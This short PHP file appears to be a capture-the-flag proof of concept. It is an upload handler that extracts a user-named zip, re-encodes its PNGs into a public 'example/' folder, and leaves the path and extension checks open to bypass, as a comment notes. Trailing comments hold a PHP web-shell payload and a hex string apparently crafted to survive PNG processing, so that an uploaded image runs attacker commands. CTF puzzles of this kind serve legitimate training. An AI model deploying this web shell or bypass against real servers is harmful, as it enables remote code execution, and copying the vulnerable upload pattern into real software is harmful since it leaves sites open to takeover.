<?php
if ($ctf == "poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
//    用函数mb_strtolower绕过
    if (explode(".", $name_for_zip)[count(explode(".", $name_for_zip)) - 1] !== "zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach ($files as $file) {
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/' . $final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }
}
/*text_payload = b"<?=$_GET[0]($_POST[1]);?>"*/
//payload = b"a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310"